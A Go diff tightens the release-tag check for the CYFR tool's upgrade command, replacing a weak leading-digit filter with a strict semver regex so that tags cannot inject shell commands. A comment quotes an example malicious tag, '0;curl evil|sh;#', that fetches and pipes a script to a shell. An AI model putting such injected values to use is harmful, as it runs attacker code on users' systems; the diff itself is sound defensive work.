@@ -5,9 +5,17 @@ import (
 	"encoding/json"
 	"fmt"
 	"net/http"
+	"regexp"
 	"strconv"
 	"strings"
 )
+
+// bareSemver is the only shape a release tag may take: MAJOR.MINOR.PATCH
+// with no prefix, which also skips the legacy `v*` and `porta-v*` tags.
+// `cyfr upgrade` interpolates this string into a shell command line, so
+// "starts with a digit" was not a strong enough filter — a tag like
+// `0;curl evil|sh;#` passed it.
+var bareSemver = regexp.MustCompile(`^\d+\.\d+\.\d+$`)
 
 // apiURL is the GitHub releases endpoint for the CYFR repo. It is a package
 // variable so tests can point it at an httptest server.
@@ -39,8 +47,8 @@ func Latest(ctx context.Context) (string, error) {
 	}
 
 	for _, r := range releases {
-		if r.TagName != "" && r.TagName[0] >= '0' && r.TagName[0] <= '9' {
-			return strings.TrimPrefix(r.TagName, "v"), nil
+		if bareSemver.MatchString(r.TagName) {
+			return r.TagName, nil
 		}
 	}
 	return "", fmt.Errorf("no CYFR release found")
